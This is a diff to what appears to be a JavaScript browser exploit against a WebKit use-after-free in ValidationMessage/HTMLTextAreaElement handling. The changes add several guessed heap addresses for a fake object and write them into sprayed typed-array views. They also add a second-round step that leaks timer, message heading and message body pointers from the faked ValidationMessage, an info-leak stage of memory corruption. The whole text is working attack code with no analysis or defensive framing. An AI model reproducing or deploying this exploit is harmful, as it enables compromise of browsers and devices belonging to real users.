@@ -42,7 +42,9 @@ var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 16 - 2) + "2px";
 var g_round = 1;
 var g_input = null;
 
-var guess_htmltextarea_addr = new Int64("0x2031b00d8");
+var guess_htmltextarea_addr = new Int64("0x20a505b48");
+var guess_htmltextarea_addr = new Int64("0x2076dfb80");
+var guess_htmltextarea_addr = new Int64("0x2076dfde0");
 
 var master_b = new Uint32Array(2);
 var slave_b =  new Uint32Array(2);
@@ -398,6 +400,8 @@ function reuseTargetObj() {
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
 		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[4] = guess_htmltextarea_addr.asDouble();   //
+		view[5] = guess_htmltextarea_addr.asDouble();   //
 
 		g_arr_ab_1.push(view);
 	}
@@ -429,6 +433,13 @@ function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
+
+			if (g_round === 2) {
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][3]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
+				g_round++;
+			}
 
 			g_fake_validation_message = g_arr_ab_1[i];
 			g_arr_ab_1 = [];
